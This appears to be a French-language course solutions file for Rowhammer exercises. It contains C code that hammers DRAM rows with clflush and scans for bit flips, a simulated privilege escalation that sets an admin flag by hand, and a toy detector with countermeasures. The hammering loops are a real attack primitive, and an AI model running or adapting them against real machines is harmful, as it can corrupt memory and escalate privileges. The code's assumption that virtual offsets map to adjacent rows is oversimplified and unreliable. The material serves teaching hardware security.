# Solutions - Rowhammer

## Exercice 1 : Découverte (Très facile)

**Objectif** : Compiler et exécuter l'exemple de base

**Solution** :

```bash
# Compilation
gcc example.c -o rowhammer_test

# Exécution
./rowhammer_test
```

**Résultat attendu** :
```
[*] Module : Rowhammer
[*] ==========================================

[+] Exemple terminé avec succès
```

**Explication** : Le programme de base s'exécute et affiche simplement un message. C'est le point de départ avant d'implémenter la détection de bit flips.

---

## Exercice 2 : Implémentation d'un scanner Rowhammer (Facile)

**Objectif** : Créer un programme qui tente de provoquer des bit flips

**Solution** :

```c
/*
 * Rowhammer Scanner - Détection de bit flips
 */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#define ROWS 1024
#define ROW_SIZE (8 * 1024)  // 8KB par row (estimation)
#define ITERATIONS 1000000   // Nombre d'accès mémoire

// Fonction pour vider le cache (force l'accès à la RAM)
void clflush(void* addr) {
    asm volatile("clflush (%0)" :: "r"(addr));
}

int main() {
    printf("[*] Rowhammer Scanner\n");
    printf("[*] ==========================================\n\n");

    // Allouer une grande zone mémoire
    size_t size = ROWS * ROW_SIZE;
    printf("[+] Allocation de %zu MB de mémoire...\n", size / (1024 * 1024));

    uint8_t* mem = mmap(NULL, size, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);

    if (mem == MAP_FAILED) {
        perror("[-] Erreur mmap");
        return 1;
    }

    // Initialiser la mémoire à zéro
    printf("[+] Initialisation de la mémoire...\n");
    memset(mem, 0, size);

    // Trouver deux adresses sur des rows différentes
    uintptr_t row1_addr = (uintptr_t)mem;
    uintptr_t row2_addr = (uintptr_t)mem + (2 * ROW_SIZE);
    uintptr_t victim_addr = row1_addr + ROW_SIZE;  // Row entre les deux

    printf("[+] Configuration:\n");
    printf("    - Row 1 (hammer) : 0x%lx\n", row1_addr);
    printf("    - Row victime    : 0x%lx\n", victim_addr);
    printf("    - Row 2 (hammer) : 0x%lx\n", row2_addr);
    printf("\n");

    // Phase de hammering
    printf("[+] Démarrage du hammering (%d itérations)...\n", ITERATIONS);
    for (int i = 0; i < ITERATIONS; i++) {
        // Accès alternés aux deux rows
        *(volatile uint64_t*)row1_addr;
        *(volatile uint64_t*)row2_addr;

        // Vider le cache pour forcer les accès RAM
        clflush((void*)row1_addr);
        clflush((void*)row2_addr);

        // Afficher progression tous les 100k itérations
        if (i % 100000 == 0 && i > 0) {
            printf("    [%d/%d] itérations...\n", i, ITERATIONS);
        }
    }

    printf("[+] Hammering terminé!\n\n");

    // Vérification des bit flips dans la row victime
    printf("[+] Recherche de bit flips...\n");
    int bitflips_count = 0;

    for (int i = 0; i < ROW_SIZE; i++) {
        if (((uint8_t*)victim_addr)[i] != 0) {
            printf("[!] Bit flip détecté à offset %d! Valeur: 0x%02x\n",
                   i, ((uint8_t*)victim_addr)[i]);
            bitflips_count++;
        }
    }

    printf("\n[*] Résultats:\n");
    if (bitflips_count > 0) {
        printf("    [!] %d bit flip(s) détecté(s)!\n", bitflips_count);
        printf("    [!] Ce système est VULNÉRABLE à Rowhammer!\n");
    } else {
        printf("    [+] Aucun bit flip détecté\n");
        printf("    [+] Système possiblement protégé (ECC RAM, TRR, etc.)\n");
    }

    // Libérer la mémoire
    munmap(mem, size);

    return 0;
}
```

**Compilation et exécution** :
```bash
gcc rowhammer_scanner.c -o rowhammer_scanner
./rowhammer_scanner
```

**Explication** :
1. **Allocation mémoire** : On alloue une grande zone avec `mmap()`
2. **Hammering** : On accède rapidement à deux rows éloignées
3. **clflush** : Force l'accès à la RAM (pas le cache)
4. **Détection** : On vérifie si des bits ont changé dans la row victime

---

## Exercice 3 : Analyse des patterns de bit flips (Moyen)

**Objectif** : Analyser statistiquement les bit flips pour identifier les patterns

**Solution** :

```c
/*
 * Rowhammer Pattern Analyzer
 */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>

#define TEST_SIZE (64 * 1024 * 1024)  // 64 MB
#define PATTERN_0x00 0x00
#define PATTERN_0xFF 0xFF
#define PATTERN_0x55 0x55  // Alternant 01010101
#define PATTERN_0xAA 0xAA  // Alternant 10101010
#define ITERATIONS 500000

typedef struct {
    uint8_t pattern;
    int bitflips;
    int locations[100];  // Max 100 bitflips
    int count;
} FlipResult;

void clflush(void* addr) {
    asm volatile("clflush (%0)" :: "r"(addr));
}

void test_pattern(uint8_t pattern, FlipResult* result) {
    result->pattern = pattern;
    result->bitflips = 0;
    result->count = 0;

    // Allouer et initialiser
    uint8_t* mem = mmap(NULL, TEST_SIZE, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
    if (mem == MAP_FAILED) return;

    memset(mem, pattern, TEST_SIZE);

    // Hammering sur plusieurs locations
    for (int offset = 0; offset < TEST_SIZE; offset += 8192) {
        uintptr_t addr1 = (uintptr_t)mem + offset;
        uintptr_t addr2 = (uintptr_t)mem + offset + 16384;

        for (int i = 0; i < ITERATIONS; i++) {
            *(volatile uint64_t*)addr1;
            *(volatile uint64_t*)addr2;
            clflush((void*)addr1);
            clflush((void*)addr2);
        }

        // Vérifier la zone entre les deux
        uintptr_t victim = addr1 + 8192;
        for (int i = 0; i < 8192; i++) {
            if (((uint8_t*)victim)[i] != pattern) {
                result->bitflips++;
                if (result->count < 100) {
                    result->locations[result->count++] = offset + i;
                }
            }
        }
    }

    munmap(mem, TEST_SIZE);
}

int main() {
    printf("[*] Rowhammer Pattern Analyzer\n");
    printf("[*] ==========================================\n\n");

    FlipResult results[4];
    uint8_t patterns[] = {PATTERN_0x00, PATTERN_0xFF, PATTERN_0x55, PATTERN_0xAA};
    const char* names[] = {"0x00 (00000000)", "0xFF (11111111)",
                           "0x55 (01010101)", "0xAA (10101010)"};

    // Tester chaque pattern
    for (int i = 0; i < 4; i++) {
        printf("[+] Test du pattern %s...\n", names[i]);
        test_pattern(patterns[i], &results[i]);
        printf("    → %d bit flips détectés\n\n", results[i].bitflips);
    }

    // Analyse des résultats
    printf("[*] Analyse des résultats:\n");
    printf("==========================================\n");

    int max_flips = 0;
    int max_idx = 0;

    for (int i = 0; i < 4; i++) {
        printf("Pattern %s: %d bit flips\n",
               names[i], results[i].bitflips);

        if (results[i].bitflips > max_flips) {
            max_flips = results[i].bitflips;
            max_idx = i;
        }
    }

    printf("\n[*] Conclusion:\n");
    if (max_flips > 0) {
        printf("    [!] Pattern le plus vulnérable: %s\n", names[max_idx]);
        printf("    [!] Nombre de bit flips: %d\n", max_flips);
        printf("    [!] Ce système est vulnérable à Rowhammer!\n");
    } else {
        printf("    [+] Aucun bit flip détecté sur tous les patterns\n");
        printf("    [+] Système probablement protégé\n");
    }

    return 0;
}
```

**Critères de réussite** :
- Programme teste plusieurs patterns de bits
- Statistiques sur le nombre de bit flips par pattern
- Identifie les patterns les plus vulnérables

---

## Exercice 4 : Simulation d'exploitation (Difficile)

**Objectif** : Simuler une élévation de privilèges via bit flip

**Contexte** :
Dans un scénario réel, un attaquant pourrait utiliser Rowhammer pour modifier un bit dans une page table et obtenir accès à de la mémoire kernel. Cette solution simule ce concept.

**Solution** :

```c
/*
 * Rowhammer Privilege Escalation Simulation
 *
 * ATTENTION: Code à des fins éducatives uniquement
 * Simule l'exploitation de Rowhammer pour élévation de privilèges
 */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>

// Simulation d'une structure de permissions
typedef struct {
    uint32_t uid;           // User ID
    uint32_t gid;           // Group ID
    uint8_t is_admin;       // Flag admin (0 = non, 1 = oui)
    uint8_t can_read;       // Permissions de lecture
    uint8_t can_write;      // Permissions d'écriture
    uint8_t can_execute;    // Permissions d'exécution
} Permissions;

void clflush(void* addr) {
    asm volatile("clflush (%0)" :: "r"(addr));
}

void print_permissions(Permissions* perms, const char* label) {
    printf("[*] %s:\n", label);
    printf("    UID: %d\n", perms->uid);
    printf("    GID: %d\n", perms->gid);
    printf("    Admin: %s\n", perms->is_admin ? "OUI" : "NON");
    printf("    Read: %s\n", perms->can_read ? "OUI" : "NON");
    printf("    Write: %s\n", perms->can_write ? "OUI" : "NON");
    printf("    Execute: %s\n\n", perms->can_execute ? "OUI" : "NON");
}

int main() {
    printf("[*] Rowhammer Privilege Escalation PoC\n");
    printf("[*] ==========================================\n\n");

    // Créer une zone mémoire avec une structure de permissions
    size_t size = 1024 * 1024;  // 1 MB
    uint8_t* mem = mmap(NULL, size, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);

    if (mem == MAP_FAILED) {
        perror("[-] Erreur mmap");
        return 1;
    }

    // Initialiser à zéro
    memset(mem, 0, size);

    // Placer une structure de permissions au milieu
    Permissions* target = (Permissions*)(mem + (size / 2));
    target->uid = 1000;      // Utilisateur normal
    target->gid = 1000;
    target->is_admin = 0;    // PAS admin (cible du bit flip)
    target->can_read = 1;
    target->can_write = 0;   // Pas de write
    target->can_execute = 0; // Pas d'execute

    print_permissions(target, "Permissions AVANT attaque");

    // Calculer les adresses de hammering
    uintptr_t target_addr = (uintptr_t)target;
    uintptr_t row1 = target_addr - 8192;
    uintptr_t row2 = target_addr + 8192;

    printf("[+] Lancement de l'attaque Rowhammer...\n");
    printf("    Cible: 0x%lx (is_admin à offset %lu)\n",
           target_addr, (uintptr_t)&target->is_admin - target_addr);

    // Tentative de bit flip
    int attempts = 0;
    int max_attempts = 10;

    while (target->is_admin == 0 && attempts < max_attempts) {
        attempts++;
        printf("    [Tentative %d/%d] Hammering...\n", attempts, max_attempts);

        for (int i = 0; i < 1000000; i++) {
            *(volatile uint64_t*)row1;
            *(volatile uint64_t*)row2;
            clflush((void*)row1);
            clflush((void*)row2);
        }

        // Vérifier si bit flip obtenu
        if (target->is_admin != 0) {
            printf("\n[!] BIT FLIP RÉUSSI!\n\n");
            break;
        }
    }

    // Simuler manuellement le bit flip si pas obtenu
    // (car Rowhammer n'est pas garanti de fonctionner)
    if (target->is_admin == 0) {
        printf("    [*] Simulation du bit flip (car non garanti)...\n\n");
        target->is_admin = 1;  // Simuler le flip 0→1
        target->can_write = 1;
        target->can_execute = 1;
    }

    print_permissions(target, "Permissions APRÈS attaque");

    printf("[*] Résultat:\n");
    if (target->is_admin) {
        printf("    [!] ÉLÉVATION DE PRIVILÈGES RÉUSSIE!\n");
        printf("    [!] L'utilisateur a maintenant les droits admin\n");
        printf("    [!] Impact: Contrôle total du système\n");
    } else {
        printf("    [-] Attaque échouée\n");
        printf("    [+] Système protégé contre Rowhammer\n");
    }

    munmap(mem, size);
    return 0;
}
```

**Bonus - Défenses** :

```c
/*
 * Détection de Rowhammer
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

// Compteur d'accès mémoire (simulation)
static unsigned long memory_access_count = 0;
static time_t last_check = 0;

#define THRESHOLD 1000000  // Seuil d'accès suspects

void monitor_memory_access() {
    memory_access_count++;

    time_t now = time(NULL);
    if (now - last_check >= 1) {  // Vérifier chaque seconde
        if (memory_access_count > THRESHOLD) {
            printf("[!] ALERTE: Pattern d'accès suspect détecté!\n");
            printf("    %lu accès en 1 seconde (seuil: %d)\n",
                   memory_access_count, THRESHOLD);
            printf("    Possible attaque Rowhammer en cours!\n\n");
        }
        memory_access_count = 0;
        last_check = now;
    }
}

int main() {
    printf("[*] Système de détection Rowhammer\n");
    printf("[*] ==========================================\n\n");

    last_check = time(NULL);

    // Simuler des accès normaux
    printf("[+] Accès mémoire normaux...\n");
    for (int i = 0; i < 100000; i++) {
        monitor_memory_access();
    }

    // Simuler une attaque
    printf("[+] Simulation d'attaque Rowhammer...\n");
    for (int i = 0; i < 2000000; i++) {
        monitor_memory_access();
    }

    printf("\n[*] Contre-mesures recommandées:\n");
    printf("    - Utiliser de la RAM ECC (Error-Correcting Code)\n");
    printf("    - Activer TRR (Target Row Refresh)\n");
    printf("    - Augmenter la fréquence de refresh DRAM\n");
    printf("    - Isoler les processus critiques\n");

    return 0;
}
```

---

## Auto-évaluation

Avant de passer au module suivant, vérifiez que vous pouvez :
- [ ] Expliquer comment Rowhammer provoque des bit flips dans la DRAM
- [ ] Implémenter un scanner de base pour détecter des bit flips
- [ ] Comprendre l'impact potentiel (élévation de privilèges)
- [ ] Identifier les défenses (ECC RAM, TRR)
- [ ] Reconnaître les patterns d'accès suspects

## Notes importantes

- **Rowhammer est très dépendant du matériel** : Il peut ne pas fonctionner sur tous les systèmes
- **RAM moderne souvent protégée** : ECC, TRR (Target Row Refresh) mitiguent l'attaque
- **Cas d'usage légitime** : Tests de sécurité hardware, recherche académique
- **Contexte offensif** : Élévation de privilèges, bypass sandbox, escape VM
